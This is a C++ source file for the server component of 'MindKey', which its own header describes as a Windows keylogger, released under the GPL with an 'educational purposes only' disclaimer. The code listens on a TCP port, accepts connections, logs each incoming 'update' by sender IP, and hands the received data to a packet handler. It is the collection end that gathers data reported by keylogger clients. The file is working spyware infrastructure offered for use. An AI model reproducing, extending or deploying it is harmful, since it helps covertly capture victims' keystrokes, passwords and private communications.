/* MindKey, Keylogger for Windows.
* While this program can potentially be used for nefarious purposes,
* it was written for educational and recreational purposes only
* and the author does not endorse illegal use.
*
* Copyright (C) 2013 - 2014 Blackhack <https://github.com/blackhack/MindKey/>
*
* This program is free software: you can redistribute it and/or modify
* it under the terms of the GNU General Public License as published by
* the Free Software Foundation, either version 3 of the License, or
* (at your option) any later version.
*
* This program is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
* GNU General Public License for more details.
*
* You should have received a copy of the GNU General Public License
* along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#include "common.hpp"
#include "MindServer.h"
#include "PacketMgr.h"

MindServer::MindServer(boost::asio::io_service& io_service, unsigned short port)
: _acceptor(io_service, boost::asio::ip::tcp::endpoint(boost::asio::ip::tcp::v4(), port))
{
    packetMgr = new PacketMgr;

    std::cout << TimeStamp() << "> " << "Listening...\n";
    ConnectionPtr newConn = std::make_shared<connection>(_acceptor.get_io_service());

    _acceptor.async_accept(newConn->socket(), boost::bind(&MindServer::HandleAccept, this, boost::asio::placeholders::error, newConn));
};

MindServer::~MindServer()
{
    delete packetMgr;
}

void MindServer::HandleAccept(const boost::system::error_code& e, ConnectionPtr conn)
{
    if (!e)
        conn->async_read(_receivedData, boost::bind(&MindServer::HandleRead, this, boost::asio::placeholders::error, conn));
    else
        std::cerr << TimeStamp() << "> " << "Exeption Acceptor: " << e.message().c_str() << std::endl;

    ConnectionPtr new_conn(new connection(_acceptor.get_io_service()));
    _acceptor.async_accept(new_conn->socket(), boost::bind(&MindServer::HandleAccept, this, boost::asio::placeholders::error, new_conn));
}

void MindServer::HandleRead(const boost::system::error_code& e, ConnectionPtr conn)
{
    if (!e)
    {
        std::cout << TimeStamp() << "> " << "Update from IP: " << conn->socket().remote_endpoint().address().to_string().c_str() << ", Size: " << _receivedData.size() << "\n";
        if (!_receivedData.empty())
            packetMgr->HandlePacket(std::move(_receivedData), conn);
        _receivedData.clear();
    }
    else
        std::cerr << TimeStamp() << "> " << "Exeption Read: " << e.message().c_str() << std::endl;
}
